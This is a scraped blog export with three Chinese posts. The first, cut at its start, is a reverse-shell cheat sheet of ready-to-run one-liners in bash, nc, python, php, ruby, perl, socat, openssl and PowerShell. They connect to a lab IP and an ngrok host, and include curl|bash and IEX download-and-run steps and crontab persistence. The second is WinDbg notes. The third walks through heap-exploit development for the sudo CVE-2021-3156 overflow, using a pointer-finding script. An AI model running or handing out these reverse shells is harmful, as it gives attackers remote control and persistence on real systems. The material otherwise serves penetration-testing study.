/dev/tcp/192.168.35.152/7777 0&gt;&amp;1 # 执行失败 zsh: 没有那个文件或目录: /dev/tcp/192.168.35.152/7777 0.tcp.ngrok.io:15122 bash -i &gt;&amp; /dev/tcp/0.tcp.ngrok.io/15122 0&gt;&amp;1 bash base64 12# /bin/bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1bash -c &#x27;&#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzUuMTUyLzc3NzcgMD4mMSAgIA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27; bash base64 URLencode 12# /bin/bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1bash -c &#x27;&#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzUuMTUyLzc3NzcgMD4mMSAgIA%3D%3D&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27; nc 123nc -e /bin/bash 192.168.35.152 7777mknod backpipe p &amp;&amp; nc 192.168.35.152 7777 0&lt;backpipe | /bin/bash 1&gt;backpipe rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.35.152 7777 &gt;/tmp/f ncat 12ncat 192.168.35.152 7777 -e /bin/bashncat --udp 192.168.35.152 7777 -e /bin/bash curl 123456# kali开启http服务，把bash命令写入html文件cat bash.html/bin/bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1# centoscurl 192.168.35.152/bash.html|bash http 攻击方： 1234# 编写shell脚本并启动http服务器echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1&quot; &gt; shell.shpython2环境下：python -m SimpleHTTPServer 80python3环境下：python -m http.server 80 被控端： 1234# 上传shell.sh文件wget 192.168.35.152/shell.sh# 执行shell.sh文件bash shell.sh crontab 1* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1 whois 12# 只能执行指定命令，如pwd命令whois -h 192.168.35.152 -p 7777 `pwd` python 1python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.35.152&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; php 1php -r &#x27;$sock=fsockopen(&quot;192.168.35.152&quot;,7777);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; ruby 12ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;192.168.35.152&quot;,7777).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27; # 执行失败ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;192.168.35.152&quot;,&quot;7777&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27; socat 1socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.35.152:7777 perl 1perl -e &#x27;use Socket;$i=&quot;192.168.35.152&quot;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27; php 1php -r &#x27;$sock=fsockopen(&quot;192.168.35.152&quot;,7777);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; openssl 12345678# 监听端openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodesopenssl s_server -quiet -key key.pem -cert cert.pem -port 7777# orncat --ssl -vv -l -p 7777# 受控端mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.35.152:7777 &gt; /tmp/s; rm /tmp/s 反弹Shell-Windows Windows下的反弹shell仅测试了nc，执行成功。 12345678【监听端】centos: 192.168.35.152【被控端】windows: 192.168.35.1 # 监听端执行[root@localhost ~]# nc -vvl 7777Ncat: Version 7.50 ( https://nmap.org/ncat )Ncat: Listening on :::7777Ncat: Listening on 0.0.0.0:7777 powercat 项目地址：https://github.com/besimorhino/powercat 1System.Net.Webclient.DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);powercat -c 192.168.35.152 -p 7777 -e cmd nc 1nc 192.168.35.152 7777 -e c:\\windows\\system32\\cmd.exe nishang Nishang是一个基于PowerShell的攻击框架，整合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。 项目地址：https://github.com/samratashok/nishang 12# 将nishang下载到攻击者本地，在目标机使用powershell执行以下命令IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.35.152 -port 7777 Reverse UDP shell 123IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.35.152/nishang/Shells/Invoke-PowerShellUdp.ps1&#x27;);Invoke-PowerShellUdp -Reverse -IPAddress 192.168.35.152 -port 7777 MSF 12345# 找出各类反弹一句话payload的路径信息msfvenom -l payloads | grep &#x27;cmd/windows/reverse&#x27;# 生成反弹shell，复制粘贴到靶机上运行msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.35.152 LPORT=7777","categories":[{"name":"pentest","slug":"pentest","permalink":"https://joe1sn.eu.org/categories/pentest/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://joe1sn.eu.org/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"windbg调试入门笔记","slug":"windbg-note","date":"2022-06-10T03:52:56.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2022/06/10/windbg-note/","link":"","permalink":"https://joe1sn.eu.org/2022/06/10/windbg-note/","excerpt":"准备点windows基础功","text":"准备点windows基础功 安装与配置 1.版本 WinDbg一般分为x86和x64，具体由调试os平台(Host)和被调试程序类型决定 x86-based Host Computer x86处理器平台上调试所有程序都使用该版本 x64-based Host Computer 分析DUMP文件：若文件是在windows XP及更新的版本生成的，则两者都可；若Windows2000及更早的版本就只能使用x86版本的WinDbg 双机调试 对于WindowsXP及其更新的系统windbg会自动适应，更老的只能使用x86版本 用户态 x64版本程序只能使用x64版本，x86版本程序则是两者皆可 2.工作空间 ​ 每调试一个程序，会涉及到要使用的参数、配置等信息，WinDBG会使用Workspace来保存这些信息，可以理解为项目文件 ​ 3.调试符号 ​ 最经典的就是使用IDA反汇编的时候，如果文件没有调试符号信息，那么函数就会被命名为sub_startaddr这样。所以在调试的时候这些信息会大大帮助我们理解程序 ​ windows的就是PDB文件， WinDBG允许用户指定一个或者多个目录存放符号文件，并使用环境变量_NT_SYMBOL_PATH指向目录，最常用的是从微软的符号服务器下载(IDA会默认加载，并且设置了全局变量为符号服务器的话每次vs编译都会从服务器拉，特别慢)，具体配置百度 相关指令 ld：自动从符号文件目录或者符号服务器加载符号文件 使用 lm 查看模块 符号的表达：模块名!函数名， 如kernel32模块的OpenProcess函数：kernel32!OpenProcess 内核不同，比如 ntdll!NtOpenProcess 和 nt!NtOpenProcess 分别表示ntdll中的NtOpenProcess函数 和 内核模块中的NtOpenProcess函数 符号检索：x [选项] Module!Symbol 符号名可以使用? * [] # +进行模糊匹配 源码级别调试 需要源文件于WinDBG在同一系统中，使用ctrl+P，指定源代码路径就行了，多个路径使用;分隔 使用ctrl+O选择源代码文件，在源代码文件中F9添加断点 调试过程 1.开始调试 反汇编代码默认停留在ntdll中的系统断点，使用g @$exentry跳转带函数入口 2.控制目标程序执行 伪寄存器@$ra表示当前函数返回地址，那么pa @$ra则表示跳出当前函数 断点命令 1.对于int 3 分别是bp bu bm bp[ID] [选项] [地址or符号[要忽略的中断次数]] [中断时执行的命令] 选项：/l 一次性断点；/c最大调用深度；/C最小调用深度 bu kernel32!GetVersion：对符号下断点 bu kernel32!GetVersio*：对包含通配符下断点 2.硬件断点 ba[ID] 访问方式 访问长度 [选项] [断点地址or符号[忽略中断次数]] [终端执行指令] 访问方式 e：读取或执行时触发 r：读取时触发 w：写入时触发 i：在执行输入输出时触发 3.条件断点 建议用到的时候百度 4.管理断点 bl：列出所有断点 bc bd be：删除 禁止 启用断点 栈窗口 123456780:000:x86&gt; k # ChildEBP RetAddr00 0019ff3c 0040112e esp+0x115e01 0019ff54 00401097 esp+0x112e02 0019ff64 00401009 esp+0x109703 0019ff80 77037a7e esp+0x100904 0019ffdc 77037a4e ntdll_76fd0000!__RtlUserThreadStart+0x2f05 0019ffec 00000000 ntdll_76fd0000!_RtlUserThreadStart+0x1b 每一行都是当前线程的一个栈帧，00~05是站的调用链，从当前到顶层。 第一列是基地址(ChildEBP)；第二列是返回地址；第三列是函数的执行地址 123456780:000:x86&gt; kb # ChildEBP RetAddr Args to Child 00 0019ff3c 0040112e 00000008 00000007 00000006 esp+0x115e01 0019ff54 00401097 00000004 00000003 0019ff80 esp+0x112e02 0019ff64 00401009 00000002 00000001 7681fa29 esp+0x109703 0019ff80 77037a7e 002f5000 f602b8bf 00000000 esp+0x100904 0019ffdc 77037a4e ffffffff 77058a01 00000000 ntdll_76fd0000!__RtlUserThreadStart+0x2f05 0019ffec 00000000 00401000 002f5000 00000000 ntdll_76fd0000!_RtlUserThreadStart+0x1b kb会显示栈上面的前3个参数 kp ：参数和参数值按函数原型显示 kv：相对于kp增加帧指针省略信息和调用约定显示 kd：列出栈中的数据 内存命令 1.查看内存 d[类型] [地址范围] dw：DWORD dd：4字节DWORD dp：8字节 df：4字节单精度浮点 dp：指针大小格式 da：ASCII字符串 db：字节和ASCII字符串 ds：ANSI_STRING dt [模块名!]类型名：显示数据类型和数据结构 2.搜索内存 s - [type] range pattern type：搜索的数据类型：b(byte) w(word) d(dword) a(ASCII) u(Unicode) range： 起始地址与终止地址 s -a 0x4000000 0x4030000 &quot;test&quot; 起始地址和搜索长度 s -a 0x0000000 L?0x7fffffff &quot;mytest&quot; 3.修改内存 e &#123;a|u|za|zu&#125; address &quot;String&quot; e &#123;a|b|d|D|f|q|u|w&#125; address [value] 4.观察内存属性 !address [Address] 脚本 winDBG可以像python一样解释执行脚本中的语言 1.伪寄存器 @$exentry：当前进程的入口，g @$exentry可以直达入口 $ip：指令指针寄存器 $ra：当前函数返回地址 $retreg：函数返回值 $csp：当前栈指针(current stack pointer) 其余建议百度 调试拓展功能 类似于插件的加载 开发的话可以参考WinDbg提供的sdk（在安装文件夹下就有）","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"dbg","slug":"dbg","permalink":"https://joe1sn.eu.org/tags/dbg/"},{"name":"Windows","slug":"Windows","permalink":"https://joe1sn.eu.org/tags/Windows/"}]},{"title":"SUDO堆溢出提权：从fuzz到exp [3]","slug":"sudo-fuzz2exp-3","date":"2022-04-13T23:40:53.000Z","updated":"2025-01-26T14:46:00.782Z","comments":true,"path":"2022/04/14/sudo-fuzz2exp-3/","link":"","permalink":"https://joe1sn.eu.org/2022/04/14/sudo-fuzz2exp-3/","excerpt":"前文：https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ 受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程 原始视频合集：https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx 原始Blog：https://liveoverflow.com/why-pick-sudo-research-target-part-1/ 原作者代码仓库：https://github.com/LiveOverflow/pwnedit","text":"前文：https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ 受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程 原始视频合集：https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx 原始Blog：https://liveoverflow.com/why-pick-sudo-research-target-part-1/ 原作者代码仓库：https://github.com/LiveOverflow/pwnedit My previous blog: https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ I was inspired by the LiveOverflow’s Sudo Vulnerability Walkthrough on youtube, but i found there’s no Chinese version of this walkthrough tutorial, so i decided to write in experimental report way to create this “from fuzz to exploit” series. Original Videos: https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx Original Blog: https://liveoverflow.com/why-pick-sudo-research-target-part-1/ Source Project Code: https://github.com/LiveOverflow/pwnedit 本节内容： Discussing Heap Exploit Strategies for sudo - Ep. 09 Developing a Tool to Find Function Pointers on The Heap | Ep. 10 Fuzzing Heap Layout to Overflow Function Pointers | Ep. 11 Developing GDB Extension for Heap Exploitation | Ep. 12 编写exp思路 对于CTF中常见的堆思路是通过堆分配算法，使用free、malloc进行exp的编写，所以一般会出现一些菜单让你使用这些功能。本质上是攻击堆分配算法 但是在漏洞利用中，只存在这一个堆溢出，我们无法进行系列的free、malloc，所以思路是能否攻击堆内的有效数据，尝试找到堆内的函数指针或者其他有用的数据。本质上是攻击堆上的数据 GDB调试 不适用asan重新编译后，使用GEF分析crash时堆的分布 一个很明显的堆溢出，再看看出发时的堆分布 断点 堆chunk 再次到达断点，堆溢出 困难与解决 这样的堆分配情况让我们很难使用堆风水去调整堆分配，并且在程序运行中会遇到各种何样的内存分配情况，哪怕是不一样的长度都会造成堆分配的不同，进而让数据分配到不同的地方。 如何解决，有两个思路 作者收到了原文报告的启发，尝试编写小工具去“控制”堆 To implement this initial technique, we wrote a rudimentary brute-forcer that executes Sudo inside gdb, overflows the “user_args” buffer, and randomly selects the following parameters: 通过覆写其他堆中的函数指针来实现rce或者提权 函数指针工具编写 思路分析 从gdb的vmmap指令我们知道程序有哪些代码段 如果在堆内存中带有x即可执行权限的话就可能存在能够被我们利用的函数指针 工具编写 写入但是没有溢出的情况下，在漏洞函数断点，dump内存 1dump binary memory /pwd/heap 0x005555555f9000 0x00555555637000 复制vmmap结果，尝试分析出有可执行权限的内存地址 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354550x00555555554000 0x0055555555b000 0x00000000000000 r-- /pwd/sudo_test/src/sudo0x0055555555b000 0x005555555d6000 0x00000000007000 r-x /pwd/sudo_test/src/sudo0x005555555d6000 0x005555555f4000 0x00000000082000 r-- /pwd/sudo_test/src/sudo0x005555555f4000 0x005555555f5000 0x0000000009f000 r-- /pwd/sudo_test/src/sudo0x005555555f5000 0x005555555f9000 0x000000000a0000 rw- /pwd/sudo_test/src/sudo0x005555555f9000 0x00555555637000 0x00000000000000 rw- [heap]0x007ffff7cc1000 0x007ffff7d02000 0x00000000000000 rw-0x007ffff7d02000 0x007ffff7d05000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d05000 0x007ffff7d0c000 0x00000000003000 r-x /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0c000 0x007ffff7d0e000 0x0000000000a000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0e000 0x007ffff7d0f000 0x0000000000b000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0f000 0x007ffff7d10000 0x0000000000c000 rw- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d10000 0x007ffff7d16000 0x00000000000000 rw-0x007ffff7d16000 0x007ffff7d1d000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache0x007ffff7d1d000 0x007ffff7d4f000 0x00000000000000 r-- /usr/lib/locale/C.UTF-8/LC_CTYPE0x007ffff7d4f000 0x007ffff7d51000 0x00000000000000 rw-0x007ffff7d51000 0x007ffff7d73000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7d73000 0x007ffff7eeb000 0x00000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7eeb000 0x007ffff7f39000 0x0000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f39000 0x007ffff7f3d000 0x000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f3d000 0x007ffff7f3f000 0x000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f3f000 0x007ffff7f43000 0x00000000000000 rw-0x007ffff7f43000 0x007ffff7f45000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f45000 0x007ffff7f56000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f56000 0x007ffff7f5c000 0x00000000013000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5c000 0x007ffff7f5d000 0x00000000019000 --- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5d000 0x007ffff7f5e000 0x00000000019000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5e000 0x007ffff7f5f000 0x0000000001a000 rw- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5f000 0x007ffff7f65000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f65000 0x007ffff7f76000 0x00000000006000 r-x /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f76000 0x007ffff7f7c000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7c000 0x007ffff7f7d000 0x0000000001c000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7d000 0x007ffff7f7e000 0x0000000001d000 rw- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7e000 0x007ffff7f82000 0x00000000000000 rw-0x007ffff7f82000 0x007ffff7f84000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7f84000 0x007ffff7f99000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7f99000 0x007ffff7fb3000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb3000 0x007ffff7fb4000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb4000 0x007ffff7fb5000 0x00000000031000 rw- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb5000 0x007ffff7fbd000 0x00000000000000 rw-0x007ffff7fbd000 0x007ffff7fbe000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fbe000 0x007ffff7fbf000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fbf000 0x007ffff7fc0000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc0000 0x007ffff7fc1000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc1000 0x007ffff7fc2000 0x00000000003000 rw- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc2000 0x007ffff7fc4000 0x00000000000000 rw-0x007ffff7fca000 0x007ffff7fce000 0x00000000000000 r-- [vvar]0x007ffff7fce000 0x007ffff7fcf000 0x00000000000000 r-x [vdso]0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack] 编写python脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384vmmap=&#x27;&#x27;&#x27;0x00555555554000 0x0055555555b000 0x00000000000000 r-- /pwd/sudo_test/src/sudo0x0055555555b000 0x005555555d6000 0x00000000007000 r-x /pwd/sudo_test/src/sudo0x005555555d6000 0x005555555f4000 0x00000000082000 r-- /pwd/sudo_test/src/sudo0x005555555f4000 0x005555555f5000 0x0000000009f000 r-- /pwd/sudo_test/src/sudo0x005555555f5000 0x005555555f9000 0x000000000a0000 rw- /pwd/sudo_test/src/sudo0x005555555f9000 0x00555555637000 0x00000000000000 rw- [heap]0x007ffff7cc1000 0x007ffff7d02000 0x00000000000000 rw-0x007ffff7d02000 0x007ffff7d05000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d05000 0x007ffff7d0c000 0x00000000003000 r-x /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0c000 0x007ffff7d0e000 0x0000000000a000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0e000 0x007ffff7d0f000 0x0000000000b000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0f000 0x007ffff7d10000 0x0000000000c000 rw- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d10000 0x007ffff7d16000 0x00000000000000 rw-0x007ffff7d16000 0x007ffff7d1d000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache0x007ffff7d1d000 0x007ffff7d4f000 0x00000000000000 r-- /usr/lib/locale/C.UTF-8/LC_CTYPE0x007ffff7d4f000 0x007ffff7d51000 0x00000000000000 rw-0x007ffff7d51000 0x007ffff7d73000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7d73000 0x007ffff7eeb000 0x00000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7eeb000 0x007ffff7f39000 0x0000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f39000 0x007ffff7f3d000 0x000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f3d000 0x007ffff7f3f000 0x000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f3f000 0x007ffff7f43000 0x00000000000000 rw-0x007ffff7f43000 0x007ffff7f45000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f45000 0x007ffff7f56000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f56000 0x007ffff7f5c000 0x00000000013000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5c000 0x007ffff7f5d000 0x00000000019000 --- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5d000 0x007ffff7f5e000 0x00000000019000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5e000 0x007ffff7f5f000 0x0000000001a000 rw- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5f000 0x007ffff7f65000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f65000 0x007ffff7f76000 0x00000000006000 r-x /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f76000 0x007ffff7f7c000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7c000 0x007ffff7f7d000 0x0000000001c000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7d000 0x007ffff7f7e000 0x0000000001d000 rw- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7e000 0x007ffff7f82000 0x00000000000000 rw-0x007ffff7f82000 0x007ffff7f84000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7f84000 0x007ffff7f99000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7f99000 0x007ffff7fb3000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb3000 0x007ffff7fb4000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb4000 0x007ffff7fb5000 0x00000000031000 rw- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb5000 0x007ffff7fbd000 0x00000000000000 rw-0x007ffff7fbd000 0x007ffff7fbe000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fbe000 0x007ffff7fbf000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fbf000 0x007ffff7fc0000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc0000 0x007ffff7fc1000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc1000 0x007ffff7fc2000 0x00000000003000 rw- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc2000 0x007ffff7fc4000 0x00000000000000 rw-0x007ffff7fca000 0x007ffff7fce000 0x00000000000000 r-- [vvar]0x007ffff7fce000 0x007ffff7fcf000 0x00000000000000 r-x [vdso]0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]&#x27;&#x27;&#x27;import structmemmap = []for mem in vmmap.splitlines(): if &#x27;r-x&#x27; in mem: start, end, size, perm, f = mem.split(&#x27; &#x27;) start = int(start, 16) end = int(end, 16) memmap.append((start, end))with open(&#x27;/pwd/heap&#x27;,&#x27;rb&#x27;) as f: heap = f.read()n = 0x41for i in range(0, len(heap), 8): heap_addr = i+0x005555555f9000 b = heap[i:i+8] q = struct.unpack(&#x27;Q&#x27;, b)[0] for mem in memmap: if q&gt;=mem[0] and q&lt;=mem[1]: # print(f&quot;0x&#123;heap_addr:016x&#125;: &#123;q:016x&#125; &#123;b&#125;&quot;) print(f&quot;set *0x&#123;heap_addr:016x&#125; = 0x&quot;+(hex(n)[2:]*5)) n += 1 if 0x000055555561b4d0 == heap_addr: print(f&quot;0x&#123;heap_addr:016x&#125;: our [buffer]&quot;) 得到结果 能堆溢出的堆在最下面，不能覆写任何函数指针，艹 重新分析，判断找到的函数是否真的被执行了，作者这里修改了他的脚本 12345678910111213n = 0x41for i in range(0, len(heap), 8): heap_addr = i+0x005555555f9000 b = heap[i:i+8] q = struct.unpack(&#x27;Q&#x27;, b)[0] for mem in memmap: if q&gt;=mem[0] and q&lt;=mem[1]: # print(f&quot;0x&#123;heap_addr:016x&#125;: &#123;q:016x&#125; &#123;b&#125;&quot;) print(f&quot;set *0x&#123;heap_addr:016x&#125; = 0x&quot;+(hex(n)[2:]*5)) n += 1 if 0x000055555561b4d0 == heap_addr: print(f&quot;0x&#123;heap_addr:016x&#125;: our [buffer]&quot;) 生成不会造成crash的文件 1echo -en &quot;0edit\\x00-s\\x000000000&quot; &gt; /tmp/normal 在gdb中设置这些值 12345678910111213set *0x00005555556149a8 = 0x4141414141set *0x00005555556149b0 = 0x4242424242set *0x0000555555615260 = 0x4343434343set *0x0000555555615268 = 0x4444444444set *0x0000555555617e00 = 0x4545454545set *0x0000555555617eb0 = 0x4646464646set *0x0000555555618378 = 0x4747474747set *0x0000555555618398 = 0x4848484848set *0x00005555556183b8 = 0x4949494949set *0x00005555556183d8 = 0x4a4a4a4a4aset *0x00005555556184d8 = 0x4b4b4b4b4bset *0x0000555555619b40 = 0x4c4c4c4c4cset *0x000055555561a0b0 = 0x4d4d4d4d4d 取消断点继续，应该就会出现一些报错了 &gt;&gt;问题 没有出现报错，并且直接执行了 脚本的相关的地址写错了 发现一个红黑树! 结果看到compar变量被我们覆盖了，说明函数真的被调用了，如果我们能覆盖compar地址，那么就能改写函数指针。重复这些过程就可以找到更多的函数指针。比如修改输入类型，然后把输入换成普通输入，set *0x000055555561a0b0 = 0x4d4d4d4d4d换掉，得到另一个crash 强制堆分配 在上一节中，能溢出的buffer位于最底层，不能更改能被使用的函数指针，所以尝试暴力取溢出长度，看看能不能分配到上面一点的位置。 